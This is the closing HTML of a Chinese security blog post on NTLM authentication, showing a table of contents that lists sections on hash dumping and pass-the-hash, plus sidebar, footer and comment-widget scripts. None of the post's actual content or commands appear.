+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">BaiKer</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://baiker.top/155adebd63bd.html">http://baiker.top/155adebd63bd.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://baiker.top" target="_blank">BaiKer</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/">安全机制</a><a class="post-meta__tags" href="/tags/%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81/">身份认证</a><a class="post-meta__tags" href="/tags/NTML/">NTML</a></div><div class="post_share"><div class="social-share" data-image="https://baiker.top/img/wallhaven-gj977q.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/f6a9bc23287a.html"><img class="next-cover" src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="https://baiker.top/img/wallhaven-gj977q.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">XSS-跨站脚本漏洞</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">BaiKer</div><div class="author-info__description">网络安全</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">67</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">30</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">54</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Baikeryoyo"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/baiker" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="/2425206200@qq.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NTML-%E7%89%88%E6%9C%AC"><span class="toc-number">2.</span> <span class="toc-text">NTML 版本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NTML-%E6%9C%AC%E5%9C%B0%E8%AE%A4%E8%AF%81"><span class="toc-number">3.</span> <span class="toc-text">NTML 本地认证</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#LM-Hash"><span class="toc-number">3.1.</span> <span class="toc-text">LM Hash</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NTML-Hash"><span class="toc-number">3.2.</span> <span class="toc-text">NTML Hash</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NTML-%E7%BD%91%E7%BB%9C%E8%AE%A4%E8%AF%81"><span class="toc-number">4.</span> <span class="toc-text">NTML 网络认证</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#NTML-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81"><span class="toc-number">4.1.</span> <span class="toc-text">NTML 身份验证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E8%AE%A4%E8%AF%81%E7%89%88%E6%9C%AC%E5%B7%AE%E5%BC%82"><span class="toc-number">4.2.</span> <span class="toc-text">网络认证版本差异</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Net-NTML-Hash"><span class="toc-number">4.3.</span> <span class="toc-text">Net-NTML Hash</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Net-NTML-Hash-V1"><span class="toc-number">4.3.1.</span> <span class="toc-text">Net-NTML Hash V1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Net-NTML-Hash-V2"><span class="toc-number">4.3.2.</span> <span class="toc-text">Net-NTML Hash V2</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0-Hash-%E8%8E%B7%E5%8F%96"><span class="toc-number">5.</span> <span class="toc-text">本地 Hash 获取</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Quarks-PwDump-%E5%B7%A5%E5%85%B7"><span class="toc-number">5.1.</span> <span class="toc-text">Quarks PwDump 工具</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Mimikatz-%E5%B7%A5%E5%85%B7"><span class="toc-number">5.2.</span> <span class="toc-text">Mimikatz 工具</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BD%AC%E5%82%A8LSASS%E8%BF%9B%E7%A8%8B"><span class="toc-number">5.3.</span> <span class="toc-text">转储LSASS进程</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#prodump-%E5%B7%A5%E5%85%B7"><span class="toc-number">5.3.1.</span> <span class="toc-text">prodump 工具</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#powershell"><span class="toc-number">5.3.2.</span> <span class="toc-text">powershell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%BB%E5%8A%A1%E7%AE%A1%E7%90%86%E5%99%A8"><span class="toc-number">5.3.3.</span> <span class="toc-text">任务管理器</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%86%E6%9E%90-lass-dmp%E6%96%87%E4%BB%B6"><span class="toc-number">5.3.4.</span> <span class="toc-text">分析 lass.dmp文件</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0-Hash-%E8%A7%A3%E5%AF%86"><span class="toc-number">6.</span> <span class="toc-text">本地 Hash 解密</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PTH-%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB"><span class="toc-number">7.</span> <span class="toc-text">PTH 哈希传递攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PTH%EF%BC%88Pass-The-Hash%EF%BC%89-%E7%AE%80%E4%BB%8B"><span class="toc-number">7.1.</span> <span class="toc-text">PTH（Pass-The-Hash） 简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PTH%EF%BC%88Pass-The-Hash%EF%BC%89-%E5%8E%9F%E7%90%86"><span class="toc-number">7.2.</span> <span class="toc-text">PTH（Pass-The-Hash） 原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PTH%EF%BC%88Pass-The-Hash%EF%BC%89-%E5%88%A9%E7%94%A8"><span class="toc-number">7.3.</span> <span class="toc-text">PTH（Pass-The-Hash） 利用</span></a></li></ol></li></ol></div></div></div></div></main><footer id="footer" style="background-image: url('https://baiker.top/img/wallhaven-gj977q.png')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By BaiKer</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="algolia-search"><div class="search-dialog"><div class="search-dialog__title" id="algolia-search-title">Algolia</div><div id="algolia-input-panel"><div id="algolia-search-input"></div></div><hr/><div id="algolia-search-results"><div id="algolia-hits"></div><div id="algolia-pagination"></div><div id="algolia-stats"></div></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/medium-zoom/dist/medium-zoom.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><script src="/js/search/algolia.js"></script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: 'B4CWJLUwBNNEjD2SoNxuy03K-gzGzoHsz',
+      appKey: '6vo75MB0241puEkTNHhBsuv9',
+      placeholder: '记得留下你的昵称和邮箱....可以快速收到回復',
+      avatar: 'monsterid',
+      meta: 'nick,mail,link'.split(','),
+      pageSize: '10',
+      lang: 'zh-CN',
+      recordIP: false,
+      serverURLs: '',
+      emojiCDN: '',
+      emojiMaps: "",
+      enableQQ: false,
+      path: window.location.pathname,
+      requiredFields: ["nick,mail"],
+      visitor: false
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !false) {
+  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script></div><link rel="stylesheet" href="https://baiker.top/css/custom.css"><script async data-pjax src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
